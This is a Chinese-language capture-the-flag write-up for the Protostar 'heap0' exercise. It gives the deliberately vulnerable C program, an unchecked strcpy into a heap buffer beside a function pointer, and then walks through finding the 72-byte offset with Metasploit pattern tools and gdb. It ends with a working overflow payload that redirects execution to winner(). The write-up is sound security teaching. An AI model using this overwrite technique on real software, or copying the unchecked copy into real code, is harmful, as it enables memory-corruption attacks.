# heap0

## （一） 题目：

\#include &lt;stdlib.h&gt;

\#include &lt;unistd.h&gt;

\#include &lt;string.h&gt;

\#include &lt;stdio.h&gt;

\#include &lt;sys/types.h&gt;

struct data {

char name\[64\];

};

struct fp {

int \(\*fp\)\(\);

};

void winner\(\)

{

printf\("level passed\n"\);

}

void nowinner\(\)

{

printf\("level has not been passed\n"\);

}

int main\(int argc, char \*\*argv\)

{

struct data \*d;

struct fp \*f;

d = malloc\(sizeof\(struct data\)\);

f = malloc\(sizeof\(struct fp\)\);

f-&gt;fp = nowinner;

printf\("data is at %p, fp is at %p\n", d, f\);

strcpy\(d-&gt;name, argv\[1\]\);

f-&gt;fp\(\);

}

## （二）解题过程：

![](/png/73.png)

解题的关键是重写函数的指针。

strcpy\(d-&gt;name, argv\[1\]\); 把参数拷贝到了data

f-&gt;fp\(\);   f-&gt;fp = nowinner;  代码流走到了nowinner，输出没有通过。

所以可以修改指针指向winner.

思路如下：

1\)gdb调试程序查看奔溃点。（可以结合pattern脚本确定，非常好用）确定崩溃的起始位置距离参数开始填充的地方多远。

2）用winner函数的入口地址替换掉奔溃地址（漏洞触发后，跳转到了winner入口地址）

思路验证：

用pattern\_create生成测试数据

root@fly:/usr/share/metasploit-framework/tools/exploit\# ./pattern\_create.rb -h

Usage: msf-pattern\_create \[options\]

Example: msf-pattern\_create -l 50 -s ABC,def,123

Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf

测试数据作为输入参数，用gdb ./heap0调试

如果不带参数，就会产生段错误，所以用r 参数的形式带参数启动

![](/png/74.png)

然后用patter\_offset -q 计算数据偏移位置

72

也就是在72个数据后 出现了奔溃的数据。 72 \*A + 奔溃数据

2） 用gdb找出winner函数的入口地址

print winner

\(gdb\) print winner

$1 = {void \(void\)} 0x8048464 &lt;winner&gt;

3\)构造漏洞利用的payload

./heap0 $\(python -c 'print “A"\*72 + "\x64\x84\x04\x08"'\)

注意后面带python语句作为参数执行时候要用 $符号。

$ ./heap0 $\(python -c 'print "A"\*72 + "\x64\x84\x04\x08"'\)

data is at 0x804a008, fp is at 0x804a050

level passed



ref:

[http://l33thacker.com/protostar-heap0-writeup/](http://l33thacker.com/protostar-heap0-writeup/)

